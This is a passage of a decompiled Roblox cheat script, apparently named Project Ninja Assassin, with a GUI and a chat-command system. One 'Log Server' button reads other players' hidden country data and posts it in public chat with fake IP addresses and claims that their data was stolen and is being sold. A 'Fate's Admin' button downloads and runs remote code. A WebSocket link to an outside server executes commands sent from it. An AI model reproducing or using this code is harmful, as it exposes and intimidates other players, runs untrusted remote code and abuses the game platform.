                v1712.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1712.BackgroundTransparency = 1
                v1712.Position = UDim2.new(0.02614378, 0, 0.0232981984, 0)
                v1712.Size = UDim2.new(0, 18, 0, 20)
                v1712.Font = Enum.Font.SourceSansBold
                v1712.Text = "MI"
                v1712.TextColor3 = Color3.fromRGB(255, 85, 0)
                v1712.TextSize = 25
                v1713.Parent = vu1711
                v1713.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1713.BackgroundTransparency = 1
                v1713.Position = UDim2.new(0.0980392322, 0, 0.0232981984, 0)
                v1713.Size = UDim2.new(0, 28, 0, 20)
                v1713.Font = Enum.Font.SourceSansBold
                v1713.Text = "SC"
                v1713.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1713.TextSize = 25
                v1714.Name = "logserver"
                v1714.Parent = vu1711
                v1714.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
                v1714.BackgroundTransparency = 1
                v1714.BorderSizePixel = 0
                v1714.Position = UDim2.new(0.0493937507, 0, 0.703036785, 0)
                v1714.Size = UDim2.new(0, 236, 0, 23)
                v1714.ZIndex = 2
                v1714.Font = Enum.Font.SourceSansBold
                v1714.Text = "Log Server"
                v1714.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1714.TextScaled = true
                v1714.TextSize = 14
                v1714.TextWrapped = true
                v1714.MouseButton1Down:connect(function()
                    ass = gethiddenproperty or get_hidden_prop
                    local v1720, v1721, v1722 = pairs(game:GetService("Players"):GetPlayers())
                    while true do
                        local v1723
                        v1722, v1723 = v1720(v1721, v1722)
                        if v1722 == nil then
                            break
                        end
                        if v1723.Name ~= game:GetService("Players").LocalPlayer.Name then
                            local v1724 = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))[ass(v1723, "CountryRegionCodeReplicate")]
                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v1723.Name .. " is from " .. tostring(v1724) .. " OS: " .. v1723.OsPlatform .. " IP: " .. math.random(728) .. "." .. math.random(326) .. "." .. math.random(99) .. ".## (IP: Successfully Logged)", "All")
                            wait(2)
                        end
                    end
                    for _ = 1, 5 do
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Program Status: Cracking...", "All")
                        wait(1)
                    end
                    wait(5)
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Program Status: Successfully Stolen Addresses, Data Being Sold To [%Encryped Site%]", "All")
                end)
                v1715.Name = "TextButton_Roundify_12px"
                v1715.Parent = v1714
                v1715.Active = true
                v1715.AnchorPoint = Vector2.new(0.5, 0.5)
                v1715.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1715.BackgroundTransparency = 1
                v1715.Position = UDim2.new(0.5, 0, 0.5, 0)
                v1715.Selectable = true
                v1715.Size = UDim2.new(1, 0, 1, 0)
                v1715.Image = "rbxassetid://3570695787"
                v1715.ImageColor3 = Color3.fromRGB(255, 128, 0)
                v1715.ScaleType = Enum.ScaleType.Slice
                v1715.SliceCenter = Rect.new(100, 100, 100, 100)
                v1715.SliceScale = 0.12
                v1716.Parent = vu1711
                v1716.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                v1716.BackgroundTransparency = 1
                v1716.Position = UDim2.new(0.0980392322, 0, 0.213774383, 0)
                v1716.Size = UDim2.new(0, 212, 0, 62)
                v1716.Font = Enum.Font.SourceSansBold
                v1716.Text = "Holy fuck some people are annoying"
                v1716.TextColor3 = Color3.fromRGB(255, 255, 255)
                v1716.TextScaled = true
                v1716.TextSize = 25
                v1716.TextWrapped = true
                local function v1725()
                    Instance.new("LocalScript", vu1704)
                    vu1704.MouseButton1Down:Connect(function()
                        vu1711:TweenPosition(UDim2.new(0.078, 0, 0.073, 0), "Out", "Bounce", 0.35)
                        wait(0.35)
                        vu1701.ClipsDescendants = true
                        vu1701:TweenSize(UDim2.new(0, 0, 0, 0), "Out", "Linear", 0.3)
                        wait(0.3)
                        vu1700:Destroy()
                    end)
                end
                coroutine.wrap(v1725)()
                local function v1727()
                    Instance.new("LocalScript", vu1710)
                    local vu1726 = false
                    vu1710.MouseButton1Down:Connect(function()
                        if vu1726 ~= false then
                            if vu1726 == true then
                                vu1711:TweenPosition(UDim2.new(0.078, 0, 0.073, 0), "Out", "Bounce", 0.35)
                                wait(0.35)
                                vu1726 = false
                            end
                        else
                            vu1711:TweenPosition(UDim2.new(1.051, 0, 0.073, 0), "Out", "Bounce", 0.35)
                            wait(0.35)
                            vu1726 = true
                        end
                    end)
                end
                coroutine.wrap(v1727)()
                local v1728 = vu1701
                vu1701.TweenSize(v1728, UDim2.new(0, 306, 0, 172), "Out", "Linear", 0.3)
                wait(0.3)
                vu1701.ClipsDescendants = false
            end
        })
        v1699:AddButton({
            Title = "Fate\'s Admin",
            Description = "Executes Fate\'s Admin script. It\'s similar to Infinite Yield, but diferent commands. Might help if some IY commands don\'t work.",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
            end
        })
        local v1729 = vu457.Misc:AddSection("Toggles")
        vu476({
            SoundVolumes = {}
        })
        v1729:AddToggle("MuteOthersSfx", {
            Title = "Mute Others SFX",
            Description = "{MAY CAUSE A BIT OF LAG} Mutes other player\'s sound effects in case someone spams them.",
            Default = false,
            Callback = function(p1730)
                if p1730 then
                    local v1731, v1732, v1733 = pairs(game:GetDescendants())
                    while true do
                        local v1734
                        v1733, v1734 = v1731(v1732, v1733)
                        if v1733 == nil then
                            break
                        end
                        if v1734:IsA("Sound") and (not v1734:FindFirstAncestor(vu53.LocalPlayer.Name) and (v1734.Name ~= "BACKGROUND" and v1734.Volume ~= 0)) then
                            vu70.SoundVolumes[v1734] = v1734.Volume
                            v1734.Volume = 0
                        end
                    end
                    MuteOthersSFX = game.DescendantAdded:Connect(function(p1735)
                        if p1735:IsA("Sound") and (not p1735:FindFirstAncestor(vu53.LocalPlayer.Name) and (p1735.Name ~= "BACKGROUND" and p1735.Volume ~= 0)) then
                            vu70.SoundVolumes[p1735] = p1735.Volume
                            p1735.Volume = 0
                        end
                    end)
                else
                    pcall(function()
                        MuteOthersSFX:Disconnect()
                        local v1736, v1737, v1738 = pairs(game:GetDescendants())
                        while true do
                            local v1739
                            v1738, v1739 = v1736(v1737, v1738)
                            if v1738 == nil then
                                break
                            end
                            if v1739:IsA("Sound") and (not v1739:FindFirstAncestor(vu53.LocalPlayer.Name) and (v1739.Name ~= "BACKGROUND" and v1739.Volume == 0)) then
                                v1739.Volume = vu70.SoundVolumes[v1739]
                                vu70.SoundVolumes[v1739] = nil
                            end
                        end
                    end)
                end
            end
        })
        v1729:AddToggle("MuteYourSfx", {
            Title = "Mute Your SFX",
            Description = "{MAY CAUSE A BIT OF LAG} Mutes your sound effects in case someone really spams them.",
            Default = false,
            Callback = function(p1740)
                if p1740 then
                    local v1741, v1742, v1743 = pairs(game:GetDescendants())
                    while true do
                        local v1744
                        v1743, v1744 = v1741(v1742, v1743)
                        if v1743 == nil then
                            break
                        end
                        if v1744:IsA("Sound") and (v1744:FindFirstAncestor(vu53.LocalPlayer.Name) and (v1744.Name ~= "BACKGROUND" and v1744.Volume ~= 0)) then
                            vu70.SoundVolumes[v1744] = v1744.Volume
                            v1744.Volume = 0
                        end
                    end
                    MuteYourSFX = game.DescendantAdded:Connect(function(p1745)
                        if p1745:IsA("Sound") and (p1745:FindFirstAncestor(vu53.LocalPlayer.Name) and (p1745.Name ~= "BACKGROUND" and p1745.Volume ~= 0)) then
                            vu70.SoundVolumes[p1745] = p1745.Volume
                            p1745.Volume = 0
                        end
                    end)
                else
                    pcall(function()
                        MuteYourSFX:Disconnect()
                        local v1746, v1747, v1748 = pairs(game:GetDescendants())
                        while true do
                            local v1749
                            v1748, v1749 = v1746(v1747, v1748)
                            if v1748 == nil then
                                break
                            end
                            if v1749:IsA("Sound") and (v1749:FindFirstAncestor(vu53.LocalPlayer.Name) and (v1749.Name ~= "BACKGROUND" and v1749.Volume == 0)) then
                                v1749.Volume = vu70.SoundVolumes[v1749]
                                vu70.SoundVolumes[v1749] = nil
                            end
                        end
                    end)
                end
            end
        })
        v1729:AddToggle("DisableWSChat", {
            Title = "Disable WebSocket Chat",
            Description = "If you successfully connected to the websocket, this will disable the chat that uses it.",
            Default = false,
            Callback = function(p1750)
                local vu1751 = p1750 and "Dis" or (not p1750 and "En" or false)
                pcall(function()
                    vu71[vu1751 .. "ableWSChat"]()
                end)
            end
        })
    end
    local function v1753()
        vu457.Credits:AddParagraph({
            Title = "Made by these sexy ass knee gears:"
        })
        vu457.Credits:AddParagraph({
            Title = "breezyjazzy9"
        })
        vu457.Credits:AddParagraph({
            Title = "MastersRep"
        })
        vu457.Credits:AddParagraph({
            Title = "Dark_Turns"
        })
        vu457.Credits:AddParagraph({
            Title = "iiStaryxz"
        })
        vu457.Credits:AddParagraph({
            Title = "HyponatedLeader666"
        })
        vu457.Credits:AddParagraph({
            Title = "Mexluhh"
        })
        vu457.Credits:AddParagraph({
            Title = "RelaxRhoku"
        })
    end
    local function v1761()
        local v1754 = vu457.Settings:AddSection("Keybinds")
        v1754:AddKeybind("CommandBarKeybind", {
            Title = "Command Bar Keybind",
            Description = "Keybind to open the command bar.",
            Mode = "Toggle",
            Default = "LeftBracket",
            ChangedCallback = function(p1755)
                vu49 = p1755
            end
        })
        v1754:AddKeybind("WebSocketChatKeybind", {
            Title = "WebSocket Chat Keybind",
            Description = "Keybind to start chatting in the WebSocket Chat.",
            Mode = "Toggle",
            Default = "Quote",
            ChangedCallback = function(p1756)
                vu50 = p1756
            end
        })
        local v1757 = vu457.Settings:AddSection("Options")
        v1757:AddDropdown("NotificationType", {
            Title = "Notification Type",
            Values = {
                "Fluent",
                "Chat"
            },
            Multi = false,
            Default = "Fluent"
        })
        vu67.NotificationType:OnChanged(function(p1758)
            vu68 = p1758
        end)
        v1757:AddInput("NotificationTimeout", {
            Title = "Notification Timeout",
            Default = vu69,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1759)
                vu69 = tonumber(p1759)
            end
        })
        vu476({
            UseOthersChatCommands = false
        })
        v1757:AddToggle("UseOthersChatCommands", {
            Title = "Use Others\' Chat Commands",
            Description = "View and execute other players\' commands (only works with players that are allowed to use the script and commands that are already in Project NA).",
            Default = false,
            Callback = function(p1760)
                vu70.UseOthersChatCommands = p1760
            end
        })
    end
    local function v1765(p1762)
        local v1763, v1764 = pcall(p1762)
        if not v1763 then
            warn("TAB ERROR:", v1764)
        end
    end
    v1765(function()
        vu71.InitCharacterTouched(vu53.LocalPlayer, "Local")
        function vu71.CharacterAdded.CharacterTouched()
            task.spawn(function()
                vu71.InitCharacterTouched(vu53.LocalPlayer, "Local")
            end)
        end
        local v1766 = vu53
        local v1767, v1768, v1769 = pairs(v1766:GetPlayers())
        while true do
            local vu1770
            v1769, vu1770 = v1767(v1768, v1769)
            if v1769 == nil then
                break
            end
            if vu71.ListFind("Whitelist", vu1770.Name) then
                vu71.InitCharacterTouched(vu1770, "WL")
                vu1770.CharacterAdded:Connect(function()
                    vu71.InitCharacterTouched(vu1770, "WL")
                end)
            end
            vu1770.CharacterAdded:Connect(function()
                local v1771, v1772, v1773 = pairs(vu74)
                while true do
                    local v1774
                    v1773, v1774 = v1771(v1772, v1773)
                    if v1773 == nil then
                        break
                    end
                    if vu71.ListFind(v1773, vu1770.Name, "Soft") then
                        vu71.ListRemove(v1773, vu1770.Name, "Soft")
                    end
                end
            end)
        end
        function vu71.PlayerAdded.WhitelistCharacterTouched(pu1775)
            if vu71.ListFind("Whitelist", pu1775.Name) then
                vu71.InitCharacterTouched(pu1775, "WL")
                pu1775.CharacterAdded:Connect(function()
                    vu71.InitCharacterTouched(pu1775, "WL")
                end)
            end
        end
        function vu71.PlayerAdded.SoftListRemoval(pu1776)
            pu1776.CharacterAdded:Connect(function()
                local v1777, v1778, v1779 = pairs(vu74)
                while true do
                    local v1780
                    v1779, v1780 = v1777(v1778, v1779)
                    if v1779 == nil then
                        break
                    end
                    if vu71.ListFind(v1779, pu1776.Name, "Soft") then
                        vu71.ListRemove(v1779, pu1776.Name, "Soft")
                    end
                end
            end)
        end
    end)
    v1765(v854)
    v1765(v855)
    v1765(v1004)
    v1765(v1104)
    v1765(v1375)
    v1765(v1503)
    v1765(v1559)
    v1765(v1636)
    v1765(v1676)
    v1765(v1698)
    v1765(v1752)
    v1765(v1753)
    v1765(v1761)
end
function vu71.InitiateCommands()
    print("[Project Ninja Assassin]: Initiating Commands..")
    local vu1781 = {
        jarvis = true,
        alexa = true,
        siri = true,
        breezy = true,
        ["."] = true,
        ["!"] = true,
        [";"] = true,
        ["?"] = true,
        [">"] = true
    }
    local vu1785 = {
        me = function(p1782)
            return {
                p1782
            }
        end,
        all = function(_)
            return vu53:GetPlayers()
        end,
        others = function(p1783)
            local v1784 = vu53:GetPlayers()
            table.remove(v1784, p1783)
            return v1784
        end
    }
    local vu1786 = nil
    local vu1787 = {}
    function FindInTable(p1788, p1789)
        if p1788 == nil then
            return false
        end
        local v1790, v1791, v1792 = pairs(p1788)
        while true do
            local v1793
            v1792, v1793 = v1790(v1791, v1792)
            if v1792 == nil then
                break
            end
            if v1793 == p1789 then
                return true
            end
        end
        return false
    end
    function AddCommand(p1794, p1795, p1796, p1797)
        vu1787[# vu1787 + 1] = {
            NAME = p1794,
            ALIAS = p1795 or {},
            FUNC = p1796,
            WSONLY = p1797 or false
        }
    end
    function RemoveCommand(p1798)
        if p1798 ~= " " then
            for v1799 = # vu1787, 1, - 1 do
                if vu1787[v1799].NAME == p1798 or FindInTable(vu1787[v1799].ALIAS, p1798) then
                    table.remove(vu1787, v1799)
                end
            end
        end
    end
    function FindCommand(p1800)
        local v1801, v1802, v1803 = pairs(vu1787)
        while true do
            local v1804
            v1803, v1804 = v1801(v1802, v1803)
            if v1803 == nil then
                break
            end
            if v1804.NAME:lower() == p1800:lower() or FindInTable(v1804.ALIAS, p1800:lower()) then
                return v1804
            end
        end
        return false
    end
    function ExecuteCommand(p1805, pu1806, pu1807)
        local vu1808 = FindCommand(p1805)
        if vu1808 then
            local _, _ = pcall(function()
                vu1808.FUNC(pu1806, pu1807)
            end)
        end
    end
    function GetPlayer(p1809, p1810)
        if p1809 == nil then
            return {
                p1810
            }
        end
        local v1811 = string.split(p1809, ",")
        local v1812, v1813, v1814 = pairs(v1811)
        local v1815 = {}
        while true do
            local v1816
            v1814, v1816 = v1812(v1813, v1814)
            if v1814 == nil then
                break
            end
            if vu1785[v1816] then
                local v1817, v1818, v1819 = pairs(vu1785[v1816](p1810))
                while true do
                    local v1820
                    v1819, v1820 = v1817(v1818, v1819)
                    if v1819 == nil then
                        break
                    end
                    table.insert(v1815, v1820)
                end
            elseif tonumber(v1816) then
                if tonumber(v1816) then
                    local v1821 = vu53:GetNameFromUserIdAsync(tonumber(v1816))
                    if v1821 then
                        table.insert(v1815, v1821)
                    end
                end
            else
                local v1822 = vu53
                local v1823, v1824, v1825 = pairs(v1822:GetPlayers())
                while true do
                    local v1826
                    v1825, v1826 = v1823(v1824, v1825)
                    if v1825 == nil then
                        break
                    end
                    if string.sub(string.lower(v1826.Name), 1, string.len(v1816)) == string.lower(v1816) or string.sub(string.lower(v1826.DisplayName), 1, string.len(v1816)) == string.lower(v1816) then
                        table.insert(v1815, v1826)
                    end
                end
            end
        end
        return v1815
    end
    function PrefixCheck(p1827)
        if vu1781[p1827[1] ] then
            return p1827[2]
        elseif vu1781[string.sub(p1827[1], 1, 1)] then
            return p1827[1]:split(string.sub(p1827[1], 1, 1))[2]
        else
            return nil
        end
    end
    function TeleportPlayer(p1828, p1829)
        if p1828 and (p1829 and (p1828.Character and (vu71.GetRoot(p1828.Character) and (p1829.Character and vu71.GetRoot(p1829.Character))))) then
            vu71.GetRoot(p1828.Character).CFrame = vu71.GetRoot(p1829.Character).CFrame
        end
    end
    function GetModeFromText(p1830)
        local v1831, v1832, v1833 = pairs(vu73.Modes)
        while true do
            local v1834
            v1833, v1834 = v1831(v1832, v1833)
            if v1833 == nil then
                break
            end
            if p1830 and string.sub(string.lower(v1834), 1, string.len(p1830)) == string.lower(p1830) then
                return v1834
            end
        end
        return nil
    end
    function ListFilter(p1835, p1836, p1837)
        local v1838, v1839, v1840 = pairs(p1835)
        local v1841 = p1837 or nil
        while true do
            local v1842
            v1840, v1842 = v1838(v1839, v1840)
            if v1840 == nil then
                break
            end
            if vu71.ListFind(v1842, p1836, v1841) then
                vu71.ListRemove(v1842, p1836, v1841)
                vu71.Notify("System", "Removed " .. p1836 .. " from the " .. v1841 .. v1842)
            end
        end
    end
    function GetBool(p1843)
        local v1844 = {
            "off",
            "false",
            "no"
        }
        if table.find({
            "on",
            "true",
            "yes"
        }, p1843) then
            return true
        elseif table.find(v1844, p1843) then
            return false
        else
            return nil
        end
    end
    AddCommand("ServerCheck", {}, function(p1845, p1846)
        local v1847 = GetPlayer(p1846.args[1], p1845)
        if v1847 and (# v1847 ~= 0 and table.find(v1847, vu53.LocalPlayer)) then
            local v1848 = {
                type = "Command",
                cmdname = "ServerJoin",
                store = {
                    args = {
                        p1846.args[2],
                        game.PlaceId,
                        game.JobId
                    },
                    strargs = ""
                }
            }
            task.wait(1)
            vu1786:Send(vu61:JSONEncode(v1848))
        end
    end)
    AddCommand("ServerJoin", {}, function(p1849, p1850)
        local v1851 = GetPlayer(p1850.args[1], p1849)
        if v1851 and (# v1851 ~= 0 and table.find(v1851, vu53.LocalPlayer)) then
            vu71.Chat("Got response back, teleporting..")
            task.wait(1)
            vu59:TeleportToPlaceInstance(p1850.args[2], p1850.args[3], vu53.LocalPlayer)
        end
    end)
    AddCommand("PlayerCheck", {}, function(_, p1852)
        local v1853 = {
            type = "Command",
            cmdname = "ReturnPlayerCheck",
            store = {
                args = {
                    p1852.args[1],
                    vu53.LocalPlayer.Name
                },
                strargs = ""
            }
        }
        task.wait(1)
        vu1786:Send(vu61:JSONEncode(v1853))
    end)
    AddCommand("ReturnPlayerCheck", {}, function(_, p1854)
        if p1854.args[1] == vu53.LocalPlayer.Name then
            vu71.Chat(p1854.args[2] .. " is currently using the script")
        end
    end)
    function vu71.CreateWSChat()
        local v1855 = Instance.new("ScreenGui")
        local vu1856 = Instance.new("Frame")
        local vu1857 = Instance.new("TextBox")
        local v1858 = Instance.new("UITextSizeConstraint")
        local vu1859 = Instance.new("ScrollingFrame")
        local v1860 = Instance.new("UIListLayout")
        local vu1861 = Instance.new("TextLabel")
        local v1862 = Instance.new("UICorner")
        local v1863 = Instance.new("LocalScript", vu1856)
        local v1864 = Instance.new("UIStroke")
        local v1865 = Instance.new("UIStroke")
        v1855.Name = "ChatGui"
        v1855.Parent = vu57
        v1855.ResetOnSpawn = false
        vu1856.Name = "ChatBG"
        vu1856.Parent = v1855
        vu1856.AnchorPoint = Vector2.new(0, 0.5)
        vu1856.BackgroundColor3 = Color3.fromRGB(26, 26, 29)
        vu1856.BackgroundTransparency = 1
        vu1856.BorderColor3 = Color3.fromRGB(26, 26, 29)
        vu1856.BorderSizePixel = 3
        vu1856.Position = UDim2.new(0.005, 0, 0.81099999, 0)
        vu1856.Size = UDim2.new(0.300000012, 0, 0.353811145, 0)
        vu1856.Visible = false
        vu1857.Name = "ChatInput"
        vu1857.Parent = vu1856
        vu1857.AnchorPoint = Vector2.new(0.5, 0.5)
        vu1857.BackgroundColor3 = Color3.fromRGB(17, 17, 20)
        vu1857.BorderColor3 = Color3.fromRGB(26, 26, 29)
        vu1857.BorderSizePixel = 0
        vu1857.Position = UDim2.new(0.5, 0, 0.953701496, 0)
        vu1857.Size = UDim2.new(1, 0, 0.0919699669, 0)
        vu1857.ClearTextOnFocus = false
        vu1857.Font = Enum.Font.Roboto
        vu1857.PlaceholderColor3 = Color3.fromRGB(109, 109, 109)
        vu1857.PlaceholderText = "Click here or press the websocket chat keybind (in settings) to chat."
        vu1857.Text = ""
        vu1857.TextColor3 = Color3.fromRGB(199, 198, 194)
        vu1857.TextScaled = true
        vu1857.TextSize = 14
        vu1857.TextWrapped = true
        vu1857.TextXAlignment = Enum.TextXAlignment.Left
        v1858.Parent = vu1857
        v1858.MaxTextSize = 25
        vu1859.Name = "MessageScroller"
        vu1859.Parent = vu1856
        vu1859.Active = true
        vu1859.AnchorPoint = Vector2.new(0.5, 0.5)
        vu1859.BackgroundColor3 = Color3.fromRGB(26, 26, 29)
        vu1859.BackgroundTransparency = 0.2
        vu1859.BorderColor3 = Color3.fromRGB(26, 26, 29)
        vu1859.BorderSizePixel = 0
        vu1859.Position = UDim2.new(0.5, 0, 0.433203012, 0)
        vu1859.Size = UDim2.new(1.00000024, 0, 0.866406024, 0)
        vu1859.CanvasSize = UDim2.new(0, 0, 0, 0)
        vu1859.ScrollBarThickness = 3
        v1860.Parent = vu1859
        v1860.SortOrder = Enum.SortOrder.LayoutOrder
        v1860.Padding = UDim.new(0, 3)
        vu1861.Name = "MessageTemplate"
        vu1861.Parent = v1863
        vu1861.AnchorPoint = Vector2.new(0.5, 0.5)
        vu1861.BackgroundColor3 = Color3.fromRGB(17, 17, 20)
        vu1861.BackgroundTransparency = 1
        vu1861.BorderColor3 = Color3.fromRGB(27, 42, 53)
        vu1861.BorderSizePixel = 0
        vu1861.Position = UDim2.new(0.5, 0, 0.102392934, 0)
        vu1861.Size = UDim2.new(1, 0, 0, 25)
        vu1861.ZIndex = 2
        vu1861.Font = Enum.Font.Roboto
        vu1861.Text = "[username]: message"
        vu1861.TextColor3 = Color3.fromRGB(255, 255, 255)
        vu1861.TextSize = 25
        vu1861.TextWrapped = true
        vu1861.TextXAlignment = Enum.TextXAlignment.Left
        vu1861.TextYAlignment = Enum.TextYAlignment.Top
        vu1861.RichText = true
        v1862.CornerRadius = UDim.new(0, 3)
        v1862.Parent = vu1861
        v1864.Parent = vu1859
        v1864.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        v1864.Color = Color3.fromRGB(26, 26, 29)
        v1864.LineJoinMode = Enum.LineJoinMode.Round
        v1864.Thickness = 3
        v1864.Transparency = 0.2
        v1864.Enabled = true
        v1865.Parent = vu1857
        v1865.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        v1865.Color = Color3.fromRGB(17, 17, 20)
        v1865.LineJoinMode = Enum.LineJoinMode.Round
        v1865.Thickness = 3
        v1865.Transparency = 0
        v1865.Enabled = true
        function vu71.EnableWSChat()
            local v1866, v1867, v1868 = pairs(vu53.LocalPlayer.PlayerGui:GetChildren())
            local v1869 = nil
            while true do
                local v1870
                v1868, v1870 = v1866(v1867, v1868)
                if v1868 == nil then
                    break
                end
                if v1870:FindFirstChild("ChooseSideFrame") then
                    v1869 = v1870
                end
            end
            if v1869 then
                v1869.AuraImgBtn.Visible = false
                v1869.SettingImgBtn.Visible = false
                v1869.StoreImgBtn.Visible = false
            end
            vu1856.Visible = true
            function vu71.CharacterAdded.WSChat()
                task.spawn(function()
                    local v1871, v1872, v1873 = pairs(vu53.LocalPlayer.PlayerGui:GetChildren())
                    local v1874 = nil
                    while true do
                        local v1875
                        v1873, v1875 = v1871(v1872, v1873)
                        if v1873 == nil then
                            break
                        end
                        if v1875:FindFirstChild("ChooseSideFrame") then
                            v1874 = v1875
                        end
                    end
                    if v1874 then
                        v1874.AuraImgBtn.Visible = false
                        v1874.SettingImgBtn.Visible = false
                        v1874.StoreImgBtn.Visible = false
                    end
                end)
            end
        end
        function vu71.DisableWSChat()
            vu1856.Visible = false
            vu71.CharacterAdded.WSChat = nil
            local v1876, v1877, v1878 = pairs(vu53.LocalPlayer.PlayerGui:GetChildren())
            local v1879 = nil
            while true do
                local v1880
                v1878, v1880 = v1876(v1877, v1878)
                if v1878 == nil then
                    break
                end
                if v1880:FindFirstChild("ChooseSideFrame") then
                    v1879 = v1880
                end
            end
            if v1879 then
                v1879.AuraImgBtn.Visible = true
                v1879.SettingImgBtn.Visible = true
                v1879.StoreImgBtn.Visible = true
            end
        end
        local vu1881 = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
        local vu1882 = 200
        local vu1883 = 1000
        local vu1884 = {}
        function vu71.AddWSMessage(p1885, p1886)
            local v1887 = math.floor(vu1859.CanvasPosition.Y) == math.floor(vu1859.CanvasSize.Y.Offset - vu1859.AbsoluteSize.Y) or vu1859.CanvasSize.Y.Offset - vu1859.AbsoluteSize.Y < 0
            local v1888 = "[" .. p1886 .. "]: " .. p1885
            local v1889 = vu1861:Clone()
            v1889.Text = v1888
            v1889.TextTransparency = 1
            v1889.Parent = vu1859
            v1889.Size = UDim2.new(1, 0, 0, v1889.TextBounds.Y)
            vu71.CreateTween(v1889, vu1881, {
                TextTransparency = 0
            }, true)
            table.insert(vu1884, {
                v1888,
                v1889
            })
            if vu1882 < # vu1884 then
                vu1884[1][2]:Destroy()
                table.remove(vu1884, 1)
            end
            vu1859.CanvasSize = UDim2.new(0, 0, 0, vu1859.UIListLayout.AbsoluteContentSize.Y)
            if v1887 then
                vu1859.CanvasPosition = Vector2.new(0, vu1859.UIListLayout.AbsoluteContentSize.Y - vu1859.AbsoluteSize.Y)
            end
        end
        vu1857.FocusLost:Connect(function(p1890)
            if p1890 and vu1856.Visible then
                local v1891 = vu1857.Text
                vu1857.Text = ""
                if vu1883 >= # v1891 and # string.gsub(v1891, " ", "") ~= 0 then
                    vu1786:Send(vu61:JSONEncode({
                        type = "Message",
                        message = v1891,
                        sender = vu53.LocalPlayer.Name
                    }))
                    vu71.AddWSMessage(v1891, vu53.LocalPlayer.Name)
                end
            else
                return
            end
        end)
        function vu71.UserInputBegan.WSChat(p1892, p1893)
            if not p1893 then
                if p1892.KeyCode == vu50 then
                    task.wait()
                    vu1857:CaptureFocus()
                end
            end
        end
        vu71.EnableWSChat()
    end
    if WebSocket then
        local v1898, v1899 = pcall(function()
            vu1786 = WebSocket.connect("wss://socket-server-template-zd6q.onrender.com:443")
            vu71.CreateWSChat()
            vu1786.OnMessage:Connect(function(p1894)
                if p1894 ~= "ping" then
                    local v1895 = vu61:JSONDecode(p1894)
                    if v1895.type ~= "Message" then
                        if v1895.type == "Command" then
                            local v1896 = v1895.cmdname
                            local v1897 = v1895.store
                            ExecuteCommand(v1896, vu53.LocalPlayer, v1897)
                        end
                    else
                        vu71.AddWSMessage(v1895.message, v1895.sender)
                    end
                end
            end)
        end)
        if v1898 then
            print("WebSocket Connected")
        else
            warn("WEBSOCKET ERROR:", v1899)
        end
    end
    if vu1786 then
        local function vu1907()
            vu1786.OnClose:Connect(function()
                print("WebSocket Disconnected")
                if vu53:FindFirstChild(vu53.LocalPlayer.Name) then
                    print("Attempting to reconnect..")
                    task.wait(1)
                    local v1900 = 0
                    while true do
                        v1900 = v1900 + 1
                        local v1905, v1906 = pcall(function()
                            vu1786 = WebSocket.connect("wss://socket-server-template-zd6q.onrender.com:443")
                            vu1786.OnMessage:Connect(function(p1901)
                                if p1901 ~= "ping" then
                                    local v1902 = vu61:JSONDecode(p1901)
                                    if v1902.type ~= "Message" then
                                        if v1902.type == "Command" then
                                            local v1903 = v1902.cmdname
                                            local v1904 = v1902.store
                                            ExecuteCommand(v1903, vu53.LocalPlayer, v1904)
                                        end
                                    else
                                        vu71.AddWSMessage(v1902.message, v1902.sender)
                                    end
                                end
                            end)
                        end)
                        if not v1905 then
                            print("Error in reconnect. Attempting to reconnect again.. (attempt " .. v1900 .. ")")
                        end
                        task.wait(10)
                        if v1905 or 50 <= v1900 then
                            if v1905 then
                                print("WebSocket Connected")
                                vu1907()
                            else
                                warn("WEBSOCKET ERROR:", v1906)
                            end
                        end
                    end
                else
                    return
                end
            end)
        end
        vu1907()
    end
    function vu71.PlayerRemoved.WebSocket(p1908)
        if p1908 == vu53.LocalPlayer then
            vu1786:Close()
        end
    end
    AddCommand("goto", {
        "to",
        "tpto"
    }, function(p1909, p1910)
        local v1911 = GetPlayer(p1910.args[1], p1909)
        if v1911 then
            local v1912, v1913, v1914 = pairs(v1911)
            while true do
                local v1915
                v1914, v1915 = v1912(v1913, v1914)
                if v1914 == nil then
                    break
                end
                TeleportPlayer(p1909, v1915)
            end
        end
    end)
    AddCommand("cbring", {
        "cb",
        "bring"
    }, function(p1916, p1917)
        local v1918 = GetPlayer(p1917.args[1], p1916)
        if v1918 then
            local v1919, v1920, v1921 = pairs(v1918)
            while true do
                local v1922
                v1921, v1922 = v1919(v1920, v1921)
                if v1921 == nil then
                    break
                end
                TeleportPlayer(v1922, p1916)
            end
        end
    end)
    AddCommand("getlist", {
        "gl",
        "printlist",
        "showlist"
    }, function(_, p1923)
        local v1924 = p1923.args[1]
        local v1925, v1926, v1927 = pairs(vu74)
        local v1928 = {}
        while true do
            local v1929
            v1927, v1929 = v1925(v1926, v1927)
            if v1927 == nil then
                break
            end
            v1928[string.lower(v1927)] = v1927
        end
        local v1930 = v1928[v1924]
        print("List name: " .. v1930)
        print("----------- // " .. string.upper(v1930) .. "ED PLAYERS // -----------")
        local v1931, v1932, v1933 = pairs(vu74[v1930])
        local v1934 = 0
        while true do
            local v1935
            v1933, v1935 = v1931(v1932, v1933)
            if v1933 == nil then
                break
            end
            print("--- MODE START: " .. string.upper(v1933) .. " ---")
            local v1936, v1937, v1938 = pairs(v1935)
            while true do
                local v1939
                v1938, v1939 = v1936(v1937, v1938)
                if v1938 == nil then
                    break
                end
                v1934 = v1934 + 1
                print(v1934, v1939)
            end
        end
        vu71.Notify("System", "The list given has been printed to the console (press F9 or execute \'game.StarterGui:SetCore(\"DevConsoleVisible\", true)\' to open it)")
    end)
    AddCommand("whitelist", {
        "wl",
        "wlist",
        "protect"
